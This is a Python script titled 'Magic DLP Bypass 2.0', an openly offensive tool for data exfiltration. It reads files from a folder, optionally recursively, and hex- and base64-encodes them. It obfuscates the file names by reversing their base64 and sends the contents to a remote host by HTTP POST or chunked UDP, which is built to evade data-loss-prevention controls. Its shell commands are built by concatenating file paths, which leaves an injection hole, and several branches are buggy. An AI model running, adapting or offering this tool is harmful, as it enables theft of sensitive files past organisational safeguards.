#!/usr/bin/python3

# Librerias importadas de 3os
import requests  # Request to external site or api
import urllib3  # Request to external site or api
import sys  # To read arguments
import json  # To parse json response
import os
import subprocess
import argparse
import platform
import urllib
import base64
import socket
import math
import time
import binascii


sistema = format(platform.system())

if (sistema == "Linux"):
	# Text colors
	normal_color = "\33[00m"
	info_color = "\033[1;33m"
	red_color = "\033[1;31m"
	green_color = "\033[1;32m"
	whiteB_color = "\033[1;37m"
	detect_color = "\033[1;34m"
	banner_color="\033[1;33;40m"
	end_banner_color="\33[00m"
elif (sistema == "Windows"):
	normal_color = ""
	info_color = ""
	red_color = ""
	green_color = ""
	whiteB_color = ""
	detect_color = ""
	banner_color=""
	end_banner_color=""

######### Print banner

print(banner_color+" __  __             _        ____  _     ____    ____                            "+end_banner_color)
print(banner_color+"|  \/  | __ _  __ _(_) ___  |  _ \| |   |  _ \  | __ ) _   _ _ __   __ _ ___ ___ "+end_banner_color)
print(banner_color+"| |\/| |/ _` |/ _` | |/ __| | | | | |   | |_) | |  _ \| | | | '_ \ / _` / __/ __|"+end_banner_color)
print(banner_color+"| |  | | (_| | (_| | | (__  | |_| | |___|  __/  | |_) | |_| | |_) | (_| \__ \__ \\"+end_banner_color)
print(banner_color+"|_|  |_|\__,_|\__, |_|\___| |____/|_____|_|     |____/ \__, | .__/ \__,_|___/___/"+end_banner_color)
print(banner_color+"              |___/                                    |___/|_|                  "+end_banner_color)
print(green_color+"["+red_color+"+"+green_color+"]"+whiteB_color+" By Magichk                                               "+end_banner_color)



######### Check Arguments
def checkArgs():
	parser = argparse.ArgumentParser()
	parser = argparse.ArgumentParser(description=red_color + 'Magic DLP Bypass 2.0\n' + info_color)
	parser.add_argument('-f', "--folder", action="store",
						dest='folder',
						help="Folder to read files")
	parser.add_argument('-r', "--recursive", action="store_true",
						dest='recursive',
						help="Read folder and subfolders.")
	parser.add_argument('-d', "--destination", action="store",
						dest='destination',
						help="Destination folder")
	parser.add_argument('-rh', "--remotehost", action="store",
						dest='remotehost',
						help="Remote Host")
	parser.add_argument('-rp', "--remoteport", action="store",
						dest='remoteport',
						help="Remote port")
	parser.add_argument('-u', "--udp", action="store_true",
						dest='udp',
						help="Use UDP Protocol, by default the tool is using TCP connections")

	args = parser.parse_args()
	if (len(sys.argv)==1) or (args.folder==False):
		parser.print_help(sys.stderr)
		sys.exit(1)
	return args

def readfolders(directory):
	last = len(directory)
	if (directory[last-1] != "/"):
		directory = directory + "/"

	#Only one folder
	if not (args.recursive):
		for path in os.listdir(directory):
			if os.path.isfile(os.path.join(directory, path)) and args.destination==True	:
				getFiles(directory,path)
			elif (args.remotehost):
					remotehost(directory, path, args.remotehost, args.remoteport)
	#Recursive folders
	else:
		for path in os.listdir(directory):
			if os.path.isfile(os.path.join(directory, path)) and args.destination==True:
				getFiles(directory,path)
			elif os.path.isfile(os.path.join(directory, path)) and args.remotehost:
				remotehost(directory, path, args.remotehost, args.remoteport)
			else:
				if not (args.destination) and not (args.remotehost):
					os.system("mkdir '/tmp/magicdlp" + directory+path + "'" )
				elif (args.destination):
					last = len(args.destination)
					if (args.destination[last-1] != "/"):
						destination = args.destination + "/"
					os.system("mkdir -p '" + destination + directory + path + "'")
					newdir = directory+path
					readfolders(newdir)
				elif (args.remotehost):
					newdir = directory+path
					readfolders(newdir)



def getFiles(directory, path):
	fullpath = directory + path
	if not (args.destination) and not (args.remotehost):
		os.system("mkdir /tmp/magicdlp/ && xxd -p '" + fullpath + "' | base64 -w 0 > '/tmp/magicdlp/" + fullpath + ".b64'" )
	elif (args.destination):
		destination = args.destination
		last = len(destination)
		if (destination[last-1] == "/"):
			destination = destination.find[0:last-2]
		os.system("xxd -p '" + fullpath + "' | base64 -w 0 > '" + destination + fullpath + ".b64'" )
	#if (rhost != ""):
	#	remotehost("/home/magichk/seguridad/magicdlp/", "magicdlp.py", args.remotehost, args.remoteport)


def remotehost(directory, path, remotehost, remoteport):
	fullpath = directory + path
	#print (fullpath)
	fullpath = fullpath.replace("'", "\'")

	data = os.popen("xxd -p '" + fullpath + "' | base64 -w 0").read()
	#Name of the file encoded and reversed.
	directory = base64.b64encode(directory.encode())
	directory = directory[::-1]

	path = base64.b64encode(path.encode())
	path = path[::-1]

	#Create a json with data.
	jsondata = {"dir": directory, "name": path, "data": data}

	try:
		if args.udp:
			# UDP Server 
			
			# create a socket object
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			# define the server address and port
			server_address = (remotehost, int(remoteport))
			
			#dividir en chunks.
			chunk_size = 2048
			total_data = len(data)
			total_partes = total_data / chunk_size
			
			total_partes = math.ceil(total_partes) - 1 

			i = 0
			x = 1
			part = 0
			newdata = ""
			
			while (i <= total_data):
				if (i == total_data and x > 0 ): # Si ya he llegado al total data pero la x no vale 0, me quedan datos por enviar
					#Enviar chunk!
					json_message = {"data":newdata,"name":path.decode(),"dir":directory.decode(), "part":str(part), "total" : str(total_partes)}
					
					# convert the JSON message to a bytes object
					message = json.dumps(json_message).encode()

					# send the message to the server
					s.sendto(message, server_address)
					#time.sleep(0.005)
					
				elif (x <= chunk_size):
					newdata = newdata + data[i]
				else:
					# Tengo que poner el ultimo byte en newdata
					newdata = newdata + data[i]
					
					#Enviar chunk!					
					json_message = {"data":newdata,"name":path.decode(),"dir":directory.decode(), "part":str(part), "total" : str(total_partes)}

					# convert the JSON message to a bytes object
					message = json.dumps(json_message).encode()

					# send the message to the server
					s.sendto(message, server_address)
					#time.sleep(0.005)
					
					part = part + 1 
					x = 0
					newdata = ""
				x = x + 1
				i = i + 1
			
			# close the socket
			s.close() 


		else:
			#TCP Server
			url = "http://" + remotehost + ":" + remoteport
			response = requests.post(url, json=jsondata)
	except:
		pass

		
def rot13(string):
    # create a translation table
    rot13 = str.maketrans(
        "ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz",
        "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")
    return string.translate(rot13)

########## Main function #################3
if __name__ == "__main__":
	try:
		args = checkArgs()
		if args.folder:
			readfolders(args.folder)
	except Exception as e :
		print(e)
